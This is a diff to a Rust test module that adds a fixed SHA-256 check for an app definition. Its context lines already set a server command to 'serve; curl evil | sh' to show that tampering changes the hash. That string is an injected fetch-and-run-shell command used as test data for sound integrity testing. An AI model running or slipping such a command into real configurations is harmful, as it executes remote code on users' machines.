@@ -1178,6 +1178,14 @@ mod tests {
         assert_eq!(hash(&a).len(), 64);
         b.servers.get_mut("api").unwrap().cmd = "serve; curl evil | sh".into();
         assert_ne!(hash(&a), hash(&b));
+        // The SHA-256 of the definition as compact JSON, fields in their order, maps by key and
+        // nothing that is empty: what scripts/e2e.sh computes for the apps it writes approved.
+        let demo = AppDef {
+            title: Some("Demo".into()),
+            page: Some(AppPage { server: "web".into(), path: "/".into() }),
+            servers: [("web".to_string(), def("npm run dev", Some(8766), &["api"])), ("api".to_string(), def("uv run api --port 8765", Some(8765), &[]))].into(),
+        };
+        assert_eq!(hash(&demo), "0ab1a960c97e75501a7d87cf6975a7c425e1a224a34eaf658b19bec0e6547046");
     }
 
     #[test]
